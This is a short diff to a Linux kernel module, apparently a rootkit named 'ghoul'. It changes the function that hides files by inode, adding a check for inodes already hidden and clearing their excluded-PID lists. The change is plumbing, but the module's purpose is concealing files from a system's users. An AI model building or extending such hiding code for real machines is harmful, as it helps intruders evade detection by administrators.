@@ -11,9 +11,30 @@ LIST_HEAD(hidden_inodes);
 void hide_file_inode(unsigned long ino)
 {
     struct inode_list *inode_entry;
+    struct pid_list *pid_entry, *temp;
 
     pr_info("ghoul: hiding inode %lu\n", ino);
 
+    // make sure inode is not already hidden
+    list_for_each_entry(inode_entry, &hidden_inodes, list) {
+        // the inode is already hidden
+        if (inode_entry->ino == ino) {
+            // no excluded PIDs - do nothing
+            if (list_empty(&inode_entry->excluded_pids))
+                return;
+            
+            // there are excluded PIDs - remove them
+            else {
+                list_for_each_entry_safe(pid_entry, temp, &inode_entry->excluded_pids, list) {
+                    list_del(&pid_entry->list);
+                    kfree(pid_entry);
+                }
+                return;
+            }
+        }
+    }
+
+    // inode was not already hidden - add it to hidden inodes list
     inode_entry = kzalloc(sizeof(struct inode_list), GFP_KERNEL);
 
     if (inode_entry == NULL) {
